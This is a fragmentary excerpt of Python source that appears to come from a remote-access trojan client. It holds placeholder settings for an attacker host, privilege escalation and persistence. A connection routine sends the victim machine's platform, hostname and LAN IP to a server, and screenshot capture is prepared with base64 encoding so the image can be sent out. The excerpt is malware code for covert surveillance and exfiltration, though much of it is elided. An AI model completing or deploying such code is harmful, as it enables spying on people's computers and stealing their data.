...
#TO BE CHANGED
host = "jasldisdaiwomiadoasd"
priv_escal = "alfoeinosfdsfkslde"
persistence = "3908mfoaisdaaweq2412eas"
...
def connectServer(ip, port):
    ...
    try:
        ...
        Send(sys.platform+" "+socket.gethostname()+" "+get_lan_ip()+END_OF_STRING)
...
#            session.send(Upload(after[9:]).encode('utf-8'))
            ...
            fileName = "scr.jpg"
#            Prepare jpg for sending
            os.system("base64 scr.jpg")
            try:
